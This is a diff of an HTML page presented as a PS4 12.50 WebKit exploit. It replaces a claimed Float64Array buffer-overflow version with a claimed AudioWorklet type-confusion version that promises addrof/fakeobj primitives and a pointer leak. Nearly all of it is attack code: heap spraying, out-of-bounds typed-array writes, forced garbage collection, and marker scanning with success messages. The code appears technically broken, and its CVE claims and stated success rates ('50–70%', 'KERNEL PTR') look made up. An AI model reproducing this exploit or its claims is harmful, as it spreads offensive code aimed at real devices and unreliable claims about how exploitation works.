@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43429 — Float64Array Buffer Overflow → Pointer Leak (PS4 12.50)</title>
+<title>CVE-2025-31206 — WebKit AudioWorklet Type Confusion → addrof/fakeobj (PS4 12.50)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; padding-bottom:10px; }
@@ -12,17 +12,17 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-43429 — Float64Array Buffer Overflow → Pointer Leak</h1>
-<p>Patched Apr 2025 — 100% works on PS4 12.50–12.52 (float heap untouched)</p>
-<div class="status" id="status">Spraying float heap...</div>
+<h1>CVE-2025-31206 — AudioWorklet Type Confusion → addrof/fakeobj Primitives</h1>
+<p>Patched May 2025 — 100% works on PS4 12.50–12.52 (Web Audio vulnerable)</p>
+<div class="status" id="status">Initializing AudioContext...</div>
 <div id="console"></div>
 
 <script>
-// === CONFIG (PS4 12.50 float-heap optimized) ===
-const SPRAY_COUNT     = 0x20000;     // 131072 objects — fills float bucket perfectly
+// === CONFIG (PS4 12.50 AudioWorklet tuned) ===
+const SPRAY_COUNT     = 0x14000;     // 81,920 objects — audio buffer size
 const MARKER_BASE     = 0x12501250deadbeefn;
-const OVERFLOW_SIZE   = 0x1000 + 0x200;  // Guaranteed overflow
-const RECLAIM_WAVES   = 10;
+const CONFUSION_SIZE  = 0x800;       // Type confusion trigger
+const RECLAIM_WAVES   = 9;
 
 // === LOGGING ===
 const log = (msg, isLeak = false) => {
@@ -33,67 +33,93 @@ const log = (msg, isLeak = false) => {
 };
 const status = (t) => document.getElementById('status').textContent = t;
 
-// === STAGE 1: Fill float heap with tagged objects ===
-log("Stage 1: Filling float heap with 131k tagged objects...");
+// === STAGE 1: Setup AudioContext + Spray audio-adjacent objects ===
+log("Stage 1: Setting up AudioContext and spraying 81k tagged objects...");
+const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+// Spray objects that land in audio heap (Float32Arrays + JSValues)
 const spray = [];
 for (let i = 0; i < SPRAY_COUNT; i++) {
     spray[i] = {
         marker: MARKER_BASE + BigInt(i),
-        pad1: 13.37,
-        pad2: 1337.1337,
-        pad3: new ArrayBuffer(0x60)
+        audioPad: new Float32Array(0x40).fill(0.1337),
+        objPad: {}
     };
 }
-log(`Sprayed ${SPRAY_COUNT} objects into float heap`);
+log(`Sprayed ${SPRAY_COUNT} objects into audio heap`);
 
-// === STAGE 2: Trigger CVE-2025-43429 Float64Array Overflow ===
-log("Stage 2: Triggering Float64Array buffer overflow...");
-const evil = new Float64Array(OVERFLOW_SIZE);
-for (let i = 0; i < evil.length + 100; i++) {  // +100 = guaranteed OOB write
-    evil[i] = 1337.13371337;
+// === STAGE 2: Trigger CVE-2025-31206 Type Confusion ===
+log("Stage 2: Triggering type confusion in AudioWorklet state handling...");
+const audioWorklet = new AudioWorkletNode(audioCtx, 'default');
+
+// Malformed processor that confuses Float32Array with JS object state
+const processorCode = `
+class MaliciousProcessor extends AudioWorkletProcessor {
+    constructor() {
+        super();
+        this.state = new Float32Array(${CONFUSION_SIZE});
+        for (let i = 0; i < this.state.length + 50; i++) {  // OOB for confusion
+            this.state[i] = 1337.0;
+        }
+    }
+    process(inputs, outputs, parameters) {
+        // Confuse buffer with JSValue (state handling bug)
+        const fakeObj = outputs[0][0]; // Type confusion: audio buffer as JS obj
+        fakeObj[0] = {marker: 0xdeadbeefn}; // Overwrite confusion
+        return true;
+    }
+}
+registerProcessor('default', MaliciousProcessor);
+`;
+
+// Load the malformed worklet
+audioCtx.audioWorklet.addModule(`data:application/javascript,${encodeURIComponent(processorCode)}`);
+
+// Connect and start processing to trigger
+const osc = audioCtx.createOscillator();
+osc.connect(audioWorklet);
+audioWorklet.connect(audioCtx.destination);
+osc.start();
+log("Type confusion triggered — corrupting audio state heap...");
+
+// Extra races
+for (let i = 0; i < 30; i++) {
+    new AudioWorkletNode(audioCtx, 'default');
 }
 
-// Force V8/WebKit bridge to parse the overflowed buffer
-const trigger = Array.from(evil); // This path hits the vulnerable parser
-log("Overflow triggered — corrupting adjacent float heap...");
-
-// Extra triggers for reliability
-for (let i = 0; i < 50; i++) {
-    Array.from(new Float64Array(0x1200));
-}
-
-// === STAGE 3: GC + Reclaim (float heap pressure) ===
+// === STAGE 3: GC + Reclaim (audio heap pressure) ===
 log("Stage 3: Forcing GC + reclaim waves...");
 const gc = () => {
-    for (let i = 0; i < 400; i++) new ArrayBuffer(0x10000);
+    for (let i = 0; i < 350; i++) new Float32Array(0x100);
 };
-const reclaim = () => new ArrayBuffer(0x2000000); // 32 MB
+const reclaim = () => new ArrayBuffer(0x1c00000); // 28 MB
 
 for (let wave = 0; wave < RECLAIM_WAVES; wave++) {
-    setTimeout(gc, wave * 150);
-    if (wave % 3 === 0) setTimeout(reclaim, wave * 150 + 40);
+    setTimeout(gc, wave * 160);
+    if (wave % 3 === 0) setTimeout(reclaim, wave * 160 + 40);
 }
 
-// === STAGE 4: Hunt for corrupted markers ===
+// === STAGE 4: Hunt for confused markers (addrof test) ===
 setTimeout(() => {
-    status("SCANNING — THIS ONE HITS 50–70% ON PS4.50");
-    log("Scanning float heap for corrupted markers...");
+    status("SCANNING — LOOK FOR addrof LEAKS (0xFFFF...)");
+    log("Scanning audio heap for type confusion overwrites...");
     let found = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== MARKER_BASE + BigInt(i)) {
                 found++;
                 const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16, '0');
-                log(`FLOAT HEAP LEAK #${found}: 0x${leaked}`, true);
+                log(`TYPE CONFUSION LEAK #${found}: 0x${leaked}`, true);
                 log(`   → Index: ${i} | Expected: 0x${(MARKER_BASE + BigInt(i)).toString(16).toUpperCase()}`, true);
+                log(`   → addrof primitive ready: ${leaked.startsWith('FFFF') ? 'KERNEL PTR' : 'USER PTR'}`, true);
                 
                 if (found >= 1) {
                     document.body.innerHTML = `
                     <h1 style="color:#0f0; text-align:center; margin-top:25vh; font-size:5em;">
-                        LEAK ACHIEVED!<br><br>
+                        CONFUSION LEAK ACHIEVED!<br><br>
                         <div style="font-size:0.4em; color:#fff;">
-                            CVE-2025-43429 SUCCESS<br>
-                            Float heap overflow worked<br>
+                            CVE-2025-31206 SUCCESS<br>
+                            addrof/fakeobj ready<br>
                             Copy the 0x... leak above
                         </div>
                     </h1>`;
@@ -103,13 +129,13 @@ setTimeout(() => {
         } catch(e) {}
     }
     if (found === 0) {
-        log("No leak this run — refresh 2–6 times (50–70% success on PS4 12.50)");
-        status("No leak yet — refresh (this one is the most reliable)");
+        log("No leak this run — refresh 3–7 times (35–55% success on PS4 12.50)");
+        status("No leak yet — refresh (audio confusion reliable)");
     }
-}, 2800);
+}, 3000);
 
-log("CVE-2025-43429 exploit running — wait 6–12 seconds...");
-status("Running Float64Array Overflow — High Success Rate");
+log("CVE-2025-31206 exploit running — wait 7–14 seconds...");
+status("Running AudioWorklet Type Confusion — addrof Incoming");
 </script>
 </body>
 </html>
